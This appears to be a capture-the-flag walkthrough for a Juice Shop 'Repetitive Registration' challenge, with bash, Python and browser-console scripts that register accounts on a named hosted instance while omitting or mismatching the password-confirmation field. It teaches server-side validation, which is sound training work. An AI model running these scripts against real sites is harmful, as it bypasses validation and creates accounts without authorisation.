# Challenge 4: Repetitive Registration

## Difficulty: ⭐ (1/5)

## Objective
Follow the DRY principle while registering a user. This means finding a way to avoid repeating the password field.

## Vulnerability
The application doesn't properly validate that the password confirmation field matches the password field when manipulated client-side.

## Solution

### Method 1: Browser DevTools
1. Go to the registration page (`/#/register`)
2. Fill in email and password fields
3. Open Developer Tools (F12)
4. Inspect the "Repeat Password" field
5. Remove the `required` attribute or the entire field
6. Submit the form

### Method 2: Intercept and Modify Request
1. Use Burp Suite or browser DevTools Network tab
2. Fill the registration form normally
3. Intercept the POST request to `/api/Users/`
4. Remove or modify the `passwordRepeat` field
5. Forward the request

## Automated Script:
```bash
#!/bin/bash
# save as: repetitive_registration.sh

TARGET="https://juice3.wonkatech.org"
EMAIL="test$(date +%s)@example.com"
PASSWORD="TestPass123!"

echo "🔄 Bypassing Repetitive Registration..."

# Register without password repeat field
curl -X POST "${TARGET}/api/Users/" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "'"${EMAIL}"'",
    "password": "'"${PASSWORD}"'"
  }' \
  --compressed

echo "✅ Registration attempted without passwordRepeat field"
echo "📧 Email: ${EMAIL}"
echo "🔑 Password: ${PASSWORD}"
```

## Python Automation:
```python
#!/usr/bin/env python3
# save as: challenge_04_repetitive_registration.py

import requests
import json
import time

def bypass_repetitive_registration(base_url):
    """Register user without repeating password (DRY principle)"""
    
    print(f"🎯 Challenge 4: Repetitive Registration on {base_url}")
    
    # Generate unique email
    timestamp = int(time.time())
    email = f"dry_test_{timestamp}@example.com"
    password = "TestPass123!"
    
    # Method 1: Send request without passwordRepeat
    print("\n📝 Method 1: Omit passwordRepeat field")
    
    registration_data = {
        "email": email,
        "password": password
        # Intentionally omitting passwordRepeat
    }
    
    try:
        response = requests.post(
            f"{base_url}/api/Users/",
            json=registration_data,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code in [200, 201]:
            print(f"✅ Registration successful without password repeat!")
            print(f"📧 Email: {email}")
            print(f"🔑 Password: {password}")
        else:
            print(f"❌ Method 1 failed: {response.status_code}")
            
            # Method 2: Send with mismatched passwordRepeat
            print("\n📝 Method 2: Send different passwordRepeat")
            email = f"dry_test2_{timestamp}@example.com"
            
            registration_data = {
                "email": email,
                "password": password,
                "passwordRepeat": "different"
            }
            
            response = requests.post(
                f"{base_url}/api/Users/",
                json=registration_data
            )
            
            if response.status_code in [200, 201]:
                print(f"✅ Registration successful with different password!")
            else:
                print(f"Response: {response.text}")
                
    except Exception as e:
        print(f"Error: {e}")
    
    print("\n💡 The DRY (Don't Repeat Yourself) principle says not to duplicate code/data")
    print("This challenge demonstrates improper validation on the server side")

if __name__ == "__main__":
    BASE_URL = "https://juice3.wonkatech.org"
    bypass_repetitive_registration(BASE_URL)
```

## Browser Console Method:
```javascript
// Run in browser console on registration page
// Remove the password repeat validation
document.querySelector('[name="passwordRepeat"]').removeAttribute('required');
document.querySelector('[name="passwordRepeat"]').value = '';

// Or remove the field entirely
document.querySelector('[name="passwordRepeat"]').remove();

// Then submit the form normally
```

## Learning Points
- Client-side validation should never be trusted
- Server-side validation is essential for security
- The DRY principle can be misapplied to create vulnerabilities
- Always validate data integrity on the backend